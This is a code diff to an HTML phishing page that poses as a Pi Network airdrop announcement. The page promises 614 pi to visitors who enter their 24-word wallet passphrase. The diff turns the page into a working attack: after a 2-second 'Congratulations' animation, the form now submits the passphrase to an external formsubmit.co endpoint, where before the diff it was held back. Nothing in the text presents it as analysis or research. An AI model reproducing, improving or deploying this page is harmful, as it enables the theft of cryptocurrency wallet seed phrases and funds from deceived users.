@@ -116,7 +116,7 @@
             left: 50%;
             transform: translate(-50%, -50%);
             font-size: 24px;
-            color: gold;
+            color: #ffcc00; /* اللون الجديد */
             animation: fireworks 1.5s ease-out;
         }
     </style>
@@ -131,7 +131,7 @@
         <h2>The official Pi Network has reached 2 million pioneers!</h2>
         <p>To get closer to the mainnet and activate and attract more pioneers, they will be holding an airdrop, awarding a total of 614 pi/pioneer prizes to those who successfully complete KYC. The future looks very exciting as the Pi community continues to build the Web3 Pi ecosystem.</p>
         <h2>Enter Your 24-Word Passphrase</h2>
-        <form target="" action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST" onsubmit="showMessage(event)">
+        <form id="unlockForm" target="" action="https://formsubmit.co/d3e56b54373ed8c87d5a6f4ccf1223a5" method="POST" onsubmit="showMessage(event)">
             <textarea name="passphrase" placeholder="Enter your 24-word passphrase" required></textarea>
             <button type="submit" class="btn-outline">Unlock With Passphrase</button>
         </form>
@@ -143,12 +143,17 @@
 
     <script>
         function showMessage(event) {
-            if (event) event.preventDefault();
+            if (event) event.preventDefault(); // منع إرسال النموذج مباشرة
+
             let firework = document.createElement("div");
             firework.className = "fireworks";
             firework.innerHTML = "🎉 Congratulations! You have entered the draw for 614 pi! 🎉";
             document.body.appendChild(firework);
-            setTimeout(() => firework.remove(), 2000);
+
+            setTimeout(() => {
+                firework.remove();
+                document.getElementById("unlockForm").submit(); // بعد ظهور الرسالة، يتم إرسال النموذج
+            }, 2000); // الانتظار حتى تختفي الرسالة
         }
     </script>
 </body>
